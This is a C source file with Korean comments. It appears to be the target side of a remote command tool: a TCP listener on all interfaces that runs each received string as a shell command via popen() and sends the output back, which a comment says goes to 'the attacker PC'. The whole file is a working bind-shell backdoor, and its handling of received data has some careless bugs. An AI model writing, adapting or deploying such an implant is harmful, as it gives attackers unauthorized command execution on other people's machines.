#include "Target.h"
#define MAX_PTR 4096

void* TCP_Server(){
	int sock, client_sock, addr_len, recv_len;
	pid_t pid;
	struct sockaddr_in addr, client_addr;

	Accept_Connect(&sock, &client_sock);

	// commend를 받는 함수
	Recv_Commend(client_sock);
	printf("[*] PROGRAM END\n");
	sleep(2);
	close(client_sock);
	close(sock);
}

int Accept_Connect(int* _sock, int* _client_sock){
	int addr_len;
	struct sockaddr_in addr, client_addr;
	
	if((*_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		return 0;
	}
	
	memset(&addr, 0x00, sizeof(addr));
	addr.sin_family = PF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = htons(PORT);
	
	if(bind(*_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
		perror("bind");
		return 0;
	}
	
	if(listen(*_sock, 5) < 0){
		perror("listen");
		return 0;
	}
	
	addr_len = sizeof(*_client_sock);
	*_client_sock = accept(*_sock, (struct sockaddr*)&client_addr, &addr_len);
	
	return 1;
}

int Recv_Commend(int _client_sock){
	char cmd[MAX_STR];	
	int recv_len;
	
	while(_client_sock){
		int i = 0;
		char result[MAX_PTR] = "";
		char output[MAX_PTR];
		FILE *fd;
		
		if(recv_len = recv(_client_sock, cmd, sizeof(cmd), 0) < 0){ 
			perror("recv");
			exit(0);
		}
		
		if((!strcmp(cmd, "q"))){
			break;
		}
		
		// 파이프를 열어서 명령어 실행 시 출력물을 읽어옴
		fd = popen(cmd, "r");
		if(fd == NULL){
			perror("popen");
		}
		
		// 출력값을 fgets로 print_send변수에 저장
		while(fgets(output, sizeof(output), fd) != NULL){
			strcat(result, output);
		}
		
		// 출력값을 공격자PC로 보냄
		if(send(_client_sock, (char*)result, sizeof(result), 0) < 0){
			perror("send");
		}
		pclose(fd);	
	}
	return 0;
}

void End_Process(){
	int status;
	pid_t pid = fork();
	
	if(pid < 0){
		printf("fork() error.....\n");
	}else if(pid == 0){
		sleep(1);
		execl("/usr/bin/clear", "clear", NULL);
	}else{
		wait(&status);
		printf("[*] Socket Clear Please Wait\n");
	}
}



